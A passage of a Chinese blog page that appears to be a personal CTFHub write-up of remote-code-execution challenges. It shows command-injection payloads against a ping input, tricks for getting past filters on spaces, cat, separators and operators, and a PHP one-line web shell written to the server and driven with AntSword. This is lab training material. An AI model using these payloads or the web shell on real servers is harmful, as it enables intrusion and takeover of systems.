+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>可以先试一下 ping 127.0.0.1 然后 列一下目录</p>
+<blockquote>
+<p>127.0.0.1 &amp; ls</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200323231831638.png"><br>可以看到一个纯数字的 php文件 里面绝对就是flag 最后那个 ma.php 是我后来传的</p>
+<p>尝试cat一下那个文件 发现被屏蔽了 more tac 等命令全都被屏蔽了 那么问题来了 这题跟第二题 屏蔽cat 有什么区别</p>
+<p>可以任意命令执行 直接重定向个马上去 用蚁剑连就可以了</p>
+<blockquote>
+<p>127.0.0.1 &amp; echo “&lt;?php @eval($_POST[‘ma’]);” &gt; ma.php</p>
+</blockquote>
+<p>重定向：简单来说就是命令行的输入和输出换个地方输入或者输出 可以直接往文件输出。</p>
+<h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><p>跟上一题完全一样 不赘述</p>
+<h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>过滤空格方法</p>
+<pre><code>&#123;cat,flag.txt&#125; 
+cat$&#123;IFS&#125;flag.txt
+cat$IFS$9flag.txt
+cat&lt;flag.txt
+cat&lt;&gt;flag.txt
+kg=$&#39;\x20flag.txt&#39;&amp;&amp;cat$kg
+(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</code></pre>
+<p>这道题目差点让我自闭</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#列一下目录</span>
+<span class="token comment" spellcheck="true">#这里&amp;&amp; 和 || 都可以 照理说 || 是不行的 应该用 &amp;&amp; </span>
+127.0.0.1<span class="token operator">||</span><span class="token function">ls</span>
+<span class="token comment" spellcheck="true">#cat一下 flagxxxx.php</span>
+127.0.0.1<span class="token operator">||</span>cat<span class="token operator">&lt;</span>flagxxxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20200323235306934.png"><br>然后我一直自闭在这里明明没有空格 他也正常执行了 为什么返回一个空行呢 </p>
+<p>反复尝试了无数遍后我无奈地打开wp但是发现wp跟我一样QWQ 原地裂开更加怀疑人生</p>
+<p>最后靶机还有 30s 的时候(一定要看源码！！！)</p>
+<p><img src="https://img-blog.csdnimg.cn/20200324001412419.png"></p>
+<h4 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h4><p>列一下目录</p>
+<blockquote>
+<p>127.0.0.1 || ls</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2020032400200341.png"></p>
+<p>列一下 flag目录</p>
+<blockquote>
+<p>127.0.0.1 || ls flag_is_here</p>
+</blockquote>
+<p>只有一个 flag.php</p>
+<p>切换到 flag 目录再cat flag.php</p>
+<blockquote>
+<p>127.0.0.1 || cd flag_is_here&amp;&amp;cat flag_40921853324810.php</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2020032400242239.png"></p>
+<h4 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h4><p>列目录 分号类类似于很多编程语言的分号 所以理论上你的所有 php 都可以写在一行里</p>
+<blockquote>
+<p>;ls</p>
+</blockquote>
+<p>然后 cat 一下flag就可以了 感觉这题比前面几题都简单一些<br><img src="https://img-blog.csdnimg.cn/2020032400302873.png"></p>
+<h4 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h4><p>首先尝试了下把分号url编码 不过是没用的 换行符 url 编码 %0a</p>
+<p>要直接在地址栏输入不然 % 会被转成url编码 %25 我这里只是演示</p>
+<p><img src="https://img-blog.csdnimg.cn/20200324004212523.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">%0Als$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;IFS&amp;#125;$(printf$&amp;#123;IFS&amp;#125;%22\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65%22)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这么长要一个一个转化为十六进制 然后手差点断掉。。。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200324005329854.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">%0Aca%27%27t$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;IFS&amp;#125;$(printf$&amp;#123;IFS&amp;#125;"\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65\x2f\x66\x6c\x61\x67\x5f\x33\x32\x31\x30\x38\x36\x39\x39\x31\x33\x30\x34\x30\x32\x2e\x70\x68\x70")</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上面的全部原理都在下面这张图中</p>
+<p><img src="https://img-blog.csdnimg.cn/20200324011729110.png"></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">ruokeqx</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://www.jojo-m.cn/2020/03/25/ctfhub_WP/">http://www.jojo-m.cn/2020/03/25/ctfhub_WP/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">ruokeqx</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/03/30/MRCTF_WP2020/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/MRCTF.png" class="responsive-img" alt="MRCTF personal writeup">
+                        
+                        <span class="card-title">MRCTF personal writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ez_bypass 你传你🐎呢 PYwebsite 套娃 Ezaudit Ezpop Ezpop_Revenge
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-30
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/MRCTF/">
+                        <span class="chip bg-color">MRCTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/25/ctfhub_WP/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/ctfhub.png" class="responsive-img" alt="ctfhub personal writeup">
+                        
+                        <span class="card-title">ctfhub personal writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            信息泄露 密码口令 SQL注入 文件上传 RCE
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('4'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">ruokeqx</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "11";
+                    var startDate = "29";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已苟延残喘 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已苟延残喘 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
+                <a href="http://www.beian.miit.gov.cn" target="_blank">浙ICP备19042041号</a>
+            </span>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=643821146" class="tooltipped" target="_blank" data-tooltip="QQ: 643821146" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+    <a href="https://blog.csdn.net/weixin_45485719" class="tooltipped" target="_blank" data-tooltip="CSDN: https://blog.csdn.net/weixin_45485719" data-position="top" data-delay="50">
+        <i class="fab fa-csdn">C</i>
+    </a>
+
+
+
+    <a href="https://github.com/ruokeqx" class="tooltipped" target="_blank" data-tooltip="GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:root@jojo-m.cn" class="tooltipped" target="_blank" data-tooltip="email" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+    <script type="text/javascript">
+    var OriginTitile=document.title,st;
+    document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ坏掉惹",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ好哦！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+    </script>
+    <script type="text/javascript">
+        WIDGET = {FID: 'BZ4GM9rmXD'}
+    </script>
+    <script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script>
+</body>
+
+</html>
